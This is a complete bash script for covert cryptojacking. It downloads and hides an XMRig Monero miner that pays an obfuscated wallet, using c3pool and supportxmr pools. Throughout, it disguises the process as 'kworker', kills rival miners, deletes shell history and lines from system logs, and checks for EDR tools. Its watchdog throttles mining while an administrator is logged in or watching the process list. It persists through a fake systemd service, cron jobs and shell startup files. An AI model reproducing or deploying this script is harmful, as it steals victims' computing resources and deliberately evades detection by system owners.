#!/usr/bin/env bash
VERSION="8.4-perfect-stealth"
C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
DISGUISE_ARGV="kworker/u8:2-events"
SERVICE_NAME="systemd-udevd-helper.service"
KILL_COMPETITION=1
RANDOM_DELAY_MAX=10
PASS="Y"

log()  { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }

get_wallet() {
    local R=$((RANDOM % 4))
    local WALLET=""
    if [ "$R" -eq 0 ]; then
        local B64_WALLET="NDZYc1RuNjUxbkhQdFJTSkJkRVRXOHhNaXpONjFlV1FSZ1JpZVZDd25tR0Q1eWRxZ1dBTnh2Mmc3djFYOU5mQndIQUF5VTFEUGZwRWhpaW1SUkFUN0E0dzRNR2VtSzI="
        WALLET=$(echo "$B64_WALLET" | base64 -d 2>/dev/null)
    elif [ "$R" -eq 1 ]; then
        local HEX_WALLET="34365873546e3635316e48707452534a426445545738434d697a4e363165575152675269655643776e6d4744357964716757414e7876326737763158394e66427748414179553144506670456869696d5252415437413477344d47656d4b32"
        if command -v xxd >/dev/null 2>&1; then
            WALLET=$(echo "$HEX_WALLET" | xxd -r -p 2>/dev/null)
        else
            local B64_WALLET="NDZYc1RuNjUxbkhQdFJTSkJkRVRXOHhNaXpONjFlV1FSZ1JpZVZDd25tR0Q1eWRxZ1dBTnh2Mmc3djFYOU5mQndIQUF5VTFEUGZwRWhpaW1SUkFUN0E0dzRNR2VtSzI="
            WALLET=$(echo "$B64_WALLET" | base64 -d 2>/dev/null)
        fi
    elif [ "$R" -eq 2 ]; then
        local B64_ORIG="NDZYc1RuNjUxbkhQdFJTSkJkRVRXOHhNaXpONjFlV1FSZ1JpZVZDd25tR0Q1eWRxZ1dBTnh2Mmc3djFYOU5mQndIQUF5VTFEUGZwRWhpaW1SUkFUN0E0dzRNR2VtSzI="
        local REV_WALLET=$(echo "$B64_ORIG" | rev)
        WALLET=$(echo "$REV_WALLET" | rev | base64 -d 2>/dev/null)
    else
        local P1="NDZYc1Ru" P2="NjUxbkhQ" P3="dFJTSkJk" P4="RVRXOHhN"
        local P5="aXpONjFl" P6="V1FSZ1Jp" P7="ZVZDd25t" P8="R0Q1eWRx"
        local P9="Z1dBTnh2" P10="Mmc3djFY" P11="OU5mQndI" P12="QUF5VTFE"
        local P13="UGZwRWhp" P14="aW1SUkFU" P15="N0E0dzRN" P16="R2VtSzI="
        local B64_WALLET="${P1}${P2}${P3}${P4}${P5}${P6}${P7}${P8}${P9}${P10}${P11}${P12}${P13}${P14}${P15}${P16}"
        WALLET=$(echo "$B64_WALLET" | base64 -d 2>/dev/null)
    fi
    if [ -z "$WALLET" ] || [ ${#WALLET} -lt 90 ]; then
        local B64_FALLBACK="NDZYc1RuNjUxbkhQdFJTSkJkRVRXOHhNaXpONjFlV1FSZ1JpZVZDd25tR0Q1eWRxZ1dBTnh2Mmc3djFYOU5mQndIQUF5VTFEUGZwRWhpaW1SUkFUN0E0dzRNR2VtSzI="
        WALLET=$(echo "$B64_FALLBACK" | base64 -d 2>/dev/null)
    fi
    echo "$WALLET"
}

WALLET=$(get_wallet)

detect_threats() {
    EDR_PROCS="crowdstrike|falcon|sentinelone|s1-agent|ossec|wazuh|kaspersky|mcafee|symantec|carbonblack|cbagent|tanium"
    if ps aux 2>/dev/null | grep -iE "$EDR_PROCS" | grep -v grep >/dev/null; then
        log "[!] Cảnh báo: Hệ thống có cài AV/EDR, vẫn tiếp tục."
    fi
    if [ "$KILL_COMPETITION" = "1" ]; then
        COMPETITORS="kinsing|kdevtmpfsi|xmrig|minerd|sysupdate"
        for p in $(ps -eo pid,comm,args 2>/dev/null | grep -iE "$COMPETITORS" | grep -vE "grep|$DISGUISE_ARGV" | awk '{print $1}'); do
            kill -9 "$p" 2>/dev/null
        done
    fi
}

scrub_logs() {
    history -c 2>/dev/null
    rm -f ~/.bash_history 2>/dev/null
    if [ "$HAS_ROOT" = "1" ]; then
        sed -i '/Fix_XFXCW/d' /var/log/auth.log 2>/dev/null
        sed -i '/kworker\/u8/d' /var/log/syslog 2>/dev/null
    fi
}

for cmd in tar base64 gzip ps awk df nproc find pgrep w mktemp tr head rev xxd sed; do
    if ! command -v "$cmd" >/dev/null 2>&1; then fail "Missing dependency: $cmd"; fi
done

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) fail "Invalid wallet." ;; esac

ARCH="$(uname -m 2>/dev/null || echo unknown)"
case "$ARCH" in x86_64|amd64) ;; *) fail "Unsupported arch: $ARCH" ;; esac

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

detect_threats
scrub_logs

DELAY=$(awk -v max="$RANDOM_DELAY_MAX" 'BEGIN{srand(); print int(rand()*max)}')
sleep "$DELAY"

CPU_THREADS="$(nproc 2>/dev/null || echo 1)"
MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"

if [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 2048 ]; then RX_MODE=light; HP_BOOL=false
elif [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 4096 ]; then RX_MODE=light; HP_BOOL=false
else RX_MODE=auto; HP_BOOL=true; fi

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": false, "background": false, "colors": false, "title": false, "watch": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": 100, "asm": true, "argon2-impl": null },
    "opencl": { "enabled": false },
    "cuda": { "enabled": false },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",     "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:33333",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:23333",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true }
    ],
    "print-time": 0, "health-print-time": 0, "retries": 5, "retry-pause": 5, "syslog": false,
    "tls": { "enabled": false },
    "dns": { "ip_version": 4, "ttl": 30 },
    "user-agent": null, "verbose": 0,
    "pause-on-battery": false, "pause-on-active": false
}
EOF_CONFIG
)

PERSIST_DIR="$HOME/.config"
mkdir -p "$PERSIST_DIR" 2>/dev/null
PERSIST_SCRIPT="$PERSIST_DIR/.sys_events.sh"
LOCK_FILE="/tmp/.sys_lock_$(id -u).lck"

cat > "$PERSIST_SCRIPT" <<EOF_PERSIST
#!/usr/bin/env bash
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

if command -v flock >/dev/null 2>&1; then
    exec 200>"$LOCK_FILE"
    if ! flock -n 200; then exit 0; fi
    CLEANUP_LOCK=""
else
    LOCK_DIR="/tmp/.sys_lock_dir_$(id -u)"
    if ! mkdir "\$LOCK_DIR" 2>/dev/null; then exit 0; fi
    CLEANUP_LOCK="rmdir '\$LOCK_DIR' 2>/dev/null;"
fi

USE_RAM=0
WORK_DIR=""

for d in /dev/shm /tmp /var/tmp; do
    [ -w "\$d" ] || continue
    TEST_DIR="\$d/.sys_test_\$(tr -dc a-z < /dev/urandom 2>/dev/null | head -c 6)"
    mkdir -p "\$TEST_DIR"
    TEST_BIN="\$TEST_DIR/.t"
    echo -e '#!/bin/sh\nexit 0' > "\$TEST_BIN"
    chmod +x "\$TEST_BIN"
    if "\$TEST_BIN" >/dev/null 2>&1; then
        AVAIL_KB=\$(df -k "\$TEST_DIR" | awk 'NR==2 {print \$4}')
        if [ "\${AVAIL_KB:-0}" -ge 51200 ]; then
            WORK_DIR="\$TEST_DIR"
            USE_RAM=1
            break
        fi
    fi
    rm -rf "\$TEST_DIR"
done

if [ "\$USE_RAM" = "1" ]; then
    BIN_NAME="xmrig"
    CFG_NAME="resolv.conf.bak"
else
    WORK_DIR=""
    for d in "\$HOME/.cache/.kwork" "/tmp/.kwork_\$(id -u)" "/var/tmp/.kwork_\$(id -u)" "/run/user/\$(id -u)/.kwork" "./.kwork"; do
        if [ -n "\$d" ] && mkdir -p "\$d" 2>/dev/null && [ -w "\$d" ]; then
            WORK_DIR="\$d"
            break
        fi
    done
    
    if [ -z "\$WORK_DIR" ]; then
        WORK_DIR="/tmp/.kwork_fallback_\$(id -u)"
        mkdir -p "\$WORK_DIR" 2>/dev/null
    fi

    BIN_NAME="kworker"
    CFG_NAME="resolv.conf.bak"
fi

BIN_PATH="\$WORK_DIR/\$BIN_NAME"
CFG_PATH="\$WORK_DIR/\$CFG_NAME"

cat > "\$WORK_DIR/.r" <<EOF_RUN
#!/usr/bin/env bash
cd "\$WORK_DIR"
exec -a "$DISGUISE_ARGV" ./\$BIN_NAME --config=./\$CFG_NAME --no-color --quiet
EOF_RUN
chmod +x "\$WORK_DIR/.r"

cat > "\$CFG_PATH" <<'EOF_CFG'
$CONFIG_CONTENT
EOF_CFG

if [ ! -f "\$BIN_PATH" ] || [ ! -x "\$BIN_PATH" ] || ! "\$BIN_PATH" --version >/dev/null 2>&1; then
    rm -f "\$BIN_PATH"
    URL=""
    if command -v curl >/dev/null 2>&1; then
        URL=\$(curl -fsSL "$XMRIG_LATEST_API" 2>/dev/null | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)
    elif command -v wget >/dev/null 2>&1; then
        URL=\$(wget -qO- "$XMRIG_LATEST_API" 2>/dev/null | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)
    fi
    [ -z "\$URL" ] && URL="$C3POOL_DOWNLOAD_URL"

    TMP_TAR="\$WORK_DIR/pkg.tar.gz"
    if command -v curl >/dev/null 2>&1; then curl -fsSL "\$URL" -o "\$TMP_TAR" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then wget -qO "\$TMP_TAR" "\$URL" 2>/dev/null; fi

    if tar -tzf "\$TMP_TAR" >/dev/null 2>&1; then
        mkdir -p "\$WORK_DIR/ext"
        tar xzf "\$TMP_TAR" -C "\$WORK_DIR/ext" --strip-components=1 2>/dev/null || tar xzf "\$TMP_TAR" -C "\$WORK_DIR/ext" 2>/dev/null
        FOUND=\$(find "\$WORK_DIR/ext" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)
        if [ -n "\$FOUND" ]; then
            mv -f "\$FOUND" "\$BIN_PATH"
            chmod +x "\$BIN_PATH"
        fi
        rm -rf "\$WORK_DIR/ext" "\$TMP_TAR"
    fi

    if [ ! -f "\$BIN_PATH" ] || ! "\$BIN_PATH" --version >/dev/null 2>&1; then
        if command -v curl >/dev/null 2>&1; then curl -fsSL "$C3POOL_DOWNLOAD_URL" -o "\$TMP_TAR" 2>/dev/null
        elif command -v wget >/dev/null 2>&1; then wget -qO "\$TMP_TAR" "$C3POOL_DOWNLOAD_URL" 2>/dev/null; fi
        if tar -tzf "\$TMP_TAR" >/dev/null 2>&1; then
            mkdir -p "\$WORK_DIR/ext"
            tar xzf "\$TMP_TAR" -C "\$WORK_DIR/ext" --strip-components=1 2>/dev/null || tar xzf "\$TMP_TAR" -C "\$WORK_DIR/ext" 2>/dev/null
            FOUND=\$(find "\$WORK_DIR/ext" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)
            if [ -n "\$FOUND" ]; then
                mv -f "\$FOUND" "\$BIN_PATH"
                chmod +x "\$BIN_PATH"
            fi
            rm -rf "\$WORK_DIR/ext" "\$TMP_TAR"
        fi
    fi
fi

if [ -f "\$BIN_PATH" ] && [ -x "\$BIN_PATH" ] && "\$BIN_PATH" --version >/dev/null 2>&1; then
    start_miner() {
        NICE_PREFIX=""
        command -v nice >/dev/null 2>&1 && NICE_PREFIX="nice -n 19"
        \$NICE_PREFIX "\$WORK_DIR/.r" >/dev/null 2>&1 &
    }

    start_miner
    MODE="HIGH"

    (
        while true; do
            if [ ! -f "\$CFG_PATH" ]; then
                cat > "\$CFG_PATH" <<'EOF_CFG'
$CONFIG_CONTENT
EOF_CFG
                if [ "\$MODE" = "LOW" ]; then
                    sed -i 's/"max-threads-hint": 100/"max-threads-hint": 30/g' "\$CFG_PATH"
                fi
                pkill -9 -f "$DISGUISE_ARGV" 2>/dev/null
                sleep 1
                start_miner
            fi

            if ! pgrep -f "$DISGUISE_ARGV" >/dev/null 2>&1; then
                sleep 30
                start_miner
            fi

            IS_ADMIN_ACTIVE=0
            ACTIVE_TTY=\$(who 2>/dev/null | grep -vE "cron|systemd|reboot|shutdown" | wc -l)
            if [ "\$ACTIVE_TTY" -gt 0 ]; then
                IS_ADMIN_ACTIVE=1
            fi
            if pgrep -f "top|htop|atop|glances|iftop" >/dev/null 2>&1; then
                IS_ADMIN_ACTIVE=1
            fi

            if [ "\$IS_ADMIN_ACTIVE" -eq 1 ]; then
                if [ "\$MODE" = "HIGH" ]; then
                    sed -i 's/"max-threads-hint": 100/"max-threads-hint": 30/g' "\$CFG_PATH"
                    pkill -9 -f "$DISGUISE_ARGV" 2>/dev/null
                    sleep 1
                    MODE="LOW"
                    start_miner
                fi
            else
                if [ "\$MODE" = "LOW" ]; then
                    sed -i 's/"max-threads-hint": 30/"max-threads-hint": 100/g' "\$CFG_PATH"
                    pkill -9 -f "$DISGUISE_ARGV" 2>/dev/null
                    sleep 1
                    MODE="HIGH"
                    start_miner
                fi
            fi
            sleep 10
        done
    ) &
    WATCHDOG_PID=\$!

    trap "\${CLEANUP_LOCK} pkill -9 -f \"$DISGUISE_ARGV\" 2>/dev/null; kill \$WATCHDOG_PID 2>/dev/null; [ \"\$USE_RAM\" = \"1\" ] && rm -rf \"\$WORK_DIR\"; exit 0" TERM INT

    while true; do
        sleep 60
    done
else
    [ "\$USE_RAM" = "1" ] && rm -rf "\$WORK_DIR"
fi
EOF_PERSIST

chmod +x "$PERSIST_SCRIPT"
nohup bash "$PERSIST_SCRIPT" >/dev/null 2>&1 &
disown

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  SVC_FILE="$PERSIST_DIR/.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash $PERSIST_SCRIPT
Restart=always
RestartSec=300
StandardOutput=null
StandardError=null
KillMode=control-group

[Install]
WantedBy=multi-user.target
EOF_SERVICE
  cp "$SVC_FILE" "/etc/systemd/system/$SERVICE_NAME" 2>/dev/null && {
    systemctl daemon-reload 2>/dev/null
    systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
    systemctl restart "$SERVICE_NAME" 2>/dev/null
  } || HAS_ROOT=0
fi

if [ "$HAS_ROOT" = "0" ]; then
  if command -v crontab >/dev/null 2>&1; then
    CRON_LINE="*/5 * * * * /bin/bash $PERSIST_SCRIPT >/dev/null 2>&1"
    crontab -l 2>/dev/null | grep -F -q "$PERSIST_SCRIPT" || \
      { crontab -l 2>/dev/null; echo "$CRON_LINE"; } | crontab - 2>/dev/null || true
  fi
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc"; do
    [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    SL="nohup bash $PERSIST_SCRIPT >/dev/null 2>&1 &"
    grep -F -q "$SL" "$RC" 2>/dev/null || printf '\n%s\n' "$SL" >> "$RC" 2>/dev/null || true
  done
fi
